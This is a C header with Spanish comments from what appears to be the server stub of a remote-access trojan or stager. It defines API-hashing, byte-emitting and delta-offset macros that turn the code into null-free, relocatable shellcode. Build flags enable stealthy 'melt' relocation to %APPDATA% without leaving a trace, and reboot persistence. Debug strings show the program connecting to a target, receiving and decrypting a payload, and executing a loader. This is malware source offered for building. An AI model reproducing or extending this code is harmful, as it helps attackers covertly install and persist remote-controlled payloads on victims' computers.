/*###############################################################################
** Macros:
**    En este fichero de encabezado estan definidos los macros preprocesador
**    encargados de:
**        *Crear e introducir hashes de las funciones en el fichero binario.
**        *Funciones para introducir BYTE/WORD/DWORD en el fichero binario.
**        *Función encargada de generar los identificadores que situan las
**            direcciones en el 'stack de direcciones'
**        *Compilación condicionada encargada de generar:
**            +Una shellcode libre de bytes nulos
**            +Direcciones relativas que permitan la reubicación del código
**            +Un gestor de errores
**            +Posibilidad de hacer melt con el ejecutable a %APPDATA%
*###############################################################################*/

#include "..\kPreprocessor\kPreprocessor.h"

/*###############################################################################
** AUTOSTART:
**    Incluye código para la persistencia tras reinicio
*###############################################################################*/
#define AUTOSTART
#undef AUTOSTART

/*###############################################################################
** DEBUG:
**    Incluye código para mostrar mensajes por consola
*###############################################################################*/
#define DEBUG
#undef DEBUG

#ifdef DEBUG
DEFINE_PYSRC(
def DEBUG_MSG(s, p=[]):
    r = "\n#ifdef DEBUG\n"
    r+= "__asm{pushad}"
    for x in p[::-1]:
        r+="__asm{push %s}"%(x)
    r+= "__asm{push %s}"%(s)
    r+= "__asm{call DWORD PTR[printf]}"
    r+= "__asm{add esp, %d}"%((len(p)+1)*4)
    r+= "__asm{popad}"
    r+= "\n#endif\n"
    return r
)DEFINE_END()
#pragma data_seg(".rdata")
const char* sDELTA[]    = {"[S]Delta offset calculado: %X.\n"};
const char* sBUFFER[]   = {"[S]Buffer de 1KB creado en: 0x%08X.\n"};
const char* sAPPDATA[]  = {"[S]%%APPDATA%% = '%S'\n"};
const char* sCK32       = {"[S]Cargando %d funciones de kernel32"};
const char* sCW32       = {"[S]Cargando %d funciones de ws2_32"};
const char* sCA32       = {"[S]Cargando %d funciones de advapi32"};
const char* sMTX        = {"[S]Iniciando MUTEX '%s'\n"};
const char* sOFFLINE    = {"[S]Ruta del fichero OFFLINE '%s'\n"};
const char* sNEWSOCKT   = {"[S]Socket creado: %X\n"};
const char* sCON        = {"[S]Conectando a: '%s'\n"};
const char* sRECV       = {"[S]Recibidos %d bytes\n"};
const char* sICRYPT     = {"[S]Iniciando descifrado.\n"};
const char* sECRYPT     = {"[S]Descifrado finalizado.\n"};
const char* sHASH       = {"[S]Comprobando que el checksum de %d bytes sea %X.\n"};
const char* sEJEC       = {"[S]Ejecutando el loader en 0x%08X.\n"};
const char* sRESET      = {"[S]Reiniciando socket.\n"};
const char* sADDR       = {" (0x%08X)... "};
const char* sOK         = {"OK\n"};
const char* sERR        = {"Error\n"};
const char* sTARGET     = {"[S]Cargando siguiente TARGET(%s:%d)...\n"};
#endif

/*###############################################################################
** MELT:
**    Si se define la compilación MELT el código generado tendrá
**    la capacidad de ejecutar la ejecución en %APPDATA% sin dejar rastro.
**    NOTA:{
**        Se añade código, como consecuencia aumenta el tamaño
**    }
*###############################################################################*/
#define MELT
#undef MELT

/*###############################################################################
** Error_Check:
**    Si se define la compilación ERR_CHECK el código generado tendrá
**    comprobación de errores.
**    NOTA:{
**        Se añade código, como consecuencia aumenta el tamaño
**    }
*###############################################################################*/
#define ERR_CHECK
#undef ERR_CHECK

/*###############################################################################
** Control de errores:
**    Constantes utilizadas en el control de errores.
**    Solamente las excepciones críticas serán controladas, y
**    se devolverá la constante de error correspondiente como
**    'Exit Code' en ExitProcess()@kernel32
*###############################################################################*/
#define ERR_NO  0x0     //No ha habido ningún error. El server ha finalizado correctamente.
#define ERR_FNC 0x1     //Ha habido un error en la funcion LoadFunctions(). Probablemente alguna función no se ha encontrado.
//#define ERR_HST 0x2     //Ha habido un error al resolver el Hostname. Probablemente debido a un problema de conexión.
#define ERR_MEM 0x3     //Ha habido un error al reservar memoria.
#define ERR_SUM 0x4     //Ha habido un error en la suma de comprobación.
#define ERR_MTX 0x5     //El server ya está en ejecución.
#define MELT_DONE 0x6   //Cerrado por MELT

/*###############################################################################
** Shellcode:
**    Si se define la compilación en modo 'shellcode' el código generado no tendrá
**    bytes nulos ni direcciones estáticas.
**    Se diferencian dos modos de shellcode:
**      [+] Direcciones relativas (SC_DELTA)
**      [+] Bytes nulos (SC_NULL)
**    
**    NOTA:{
**        Se añade código, como consecuencia aumenta el tamaño
**    }
*###############################################################################*/
#define SC_DELTA
#define SC_NULL
#undef SC_NULL
//#undef SC_DELTA

#pragma message("[i] COMPILANDO CON LAS SIGUIENTES FLAGS ACTIVADAS:")

#ifdef ERR_CHECK
    #pragma message("\t\tERR_CHECK")
#endif
#ifdef SC_DELTA
    #pragma message("\t\tSC_DELTA")
#endif
#ifdef SC_NULL
    #pragma message("\t\tSC_NULL")
#endif
#ifdef DEBUG
    #pragma message("\t\t DEBUG")
#endif
#ifdef MELT
    #pragma message("\t\t MELT")
#endif
#ifdef AUTOSTART
    #pragma message("\t\t AUTOSTART")
#endif

/*###############################################################################
** HASH_AND_EMIT:
**    Macro que recibe una secuencia de bytes y genera el hash correspondiente.
**    El algoritmo que genera el hash es el siguiente:
**      def hash(s):
**          r = 0
**          for x in s:
**              r^=(ord(x)*ord(x))
**          return r
**    Después de generar el hash lo introduce en el binario.
**    El tamaño del hash es de 16 bits (1 WORD)
*###############################################################################*/
DEFINE_PYSRC(
def HASH_AND_EMIT(s):
    r = 0
    for x in s:
        r^=(ord(x)*ord(x))
    return EMIT_WORD(r)
)DEFINE_END()

/*###############################################################################
** EMIT_* :
**    Macros que introducen en el binario diferentes datos
*###############################################################################*/
DEFINE_PYSRC(
def EMIT_BYTE(e):
    return "__asm _emit("+str(e&0xFF)+")"
def EMIT_WORD(e):
    return EMIT_BYTE(e) + EMIT_BYTE(e>>8)
def EMIT_DWORD(e):
    return EMIT_WORD(e) + EMIT_WORD(e>>16)
def EMIT_ARRAY(a):
    r = ""
    for c in a:
        r+=EMIT_BYTE(c)
    return r
)DEFINE_END()

#define STACK_OFFSET 0x40
/*###############################################################################
** API_DEFINE:
**    Macro que genera el offset de la función en el stack de APIs y calcula su
**    hash.
*###############################################################################*/
/*###############################################################################
** VAR_DEFINE:
**    Macro que genera el offset de una variable en el stack de APIs.
*###############################################################################*/
DEFINE_PYSRC(
def API_DEFINE(name):
    if not hasattr(API_DEFINE, "counter"):
        API_DEFINE.counter = 0
    else:
        API_DEFINE.counter+= 1
    return ("enum {_%s = %d-STACK_OFFSET};"+HASH_AND_EMIT(name)) % (name, API_DEFINE.counter*4)
def VAR_DEFINE(name):
    if not hasattr(API_DEFINE, "counter"):
        API_DEFINE.counter = 0
    else:
        API_DEFINE.counter+= 1
    return ("enum {_%s = %d-STACK_OFFSET};") % (name, API_DEFINE.counter*4)
)DEFINE_END()

/*###############################################################################
** CALC_STACKSIZE:
**    Macro que calcula el tamaño del stack de APIs
*###############################################################################*/
DEFINE_PYSRC(
def STACKSIZE():
    return API_DEFINE.counter*4
)DEFINE_END()

/*###############################################################################
** Macros de shellcode:
**    Conjunto de macros encargados de evitar direcciones estáticas y bytes nulos.
**    En caso de no estar activada la compilación 'SHELLCODE' estas características
**    quedan desactivadas.
*###############################################################################*/

#ifdef SC_NULL
    //0xFEEDCAFE, 0xBAADF00D, 0xC0DEC0DE, 0xBAADC0DE
    #define K 0xBAADC0DE
    /*###############################################################################
    ** pushc:
    **    Macro que pushea en el stack una constante y eliminando los bytes nulos
    **    NOTA{Se harcodean los opcodes para ahorrar el opcode de identificador de segmento}
    *###############################################################################*/
    #define pushc(addr)\
        __asm{push ((addr)-K)}\
        __asm{add DWORD PTR[esp], K}
#else //SC_NULL
    #define pushc(addr)\
        __asm{push (addr)}
#endif //SC_NULL

#ifdef SC_DELTA
    #define DELTA __asm{add DWORD PTR[esp], edi}
    /*###############################################################################
    ** movr:
    **    Macro que hace un mov con una dirección estática y la repara
    **    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
    *###############################################################################*/
    #ifdef SC_NULL
        #define movr(r, addr)\
            __asm{lea (r), [edi+((addr)-(K))]}\
            __asm{add (r), (K)}
    #else //SC_NULL
        #define movr(r, addr)\
            __asm{lea (r), [edi+(addr)]}
    #endif //SC_NULL
#else //SC_DELTA
    #define DELTA ;
    /*###############################################################################
    ** movr:
    **    Macro que hace un mov con una dirección estática y la repara
    **    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
    *###############################################################################*/
    #ifdef SC_NULL
        #define movr(r, addr)\
            __asm{mov (r), ((addr)-(K))}\
            __asm{add (r), (K)}
    #else //SC_NULL
        #define movr(r, addr)\
            __asm{mov (r), (addr)}
    #endif //SC_NULL
#endif //SC_DELTA

/*###############################################################################
** pushr:
**    Macro que pushea en el stack una dirección estática y la repara
**    TODO: COMPROBAR QUE EDI SEA EL DELTA SIEMPRE!!!
*###############################################################################*/
#define pushr(addr)\
    pushc((addr))\
    DELTA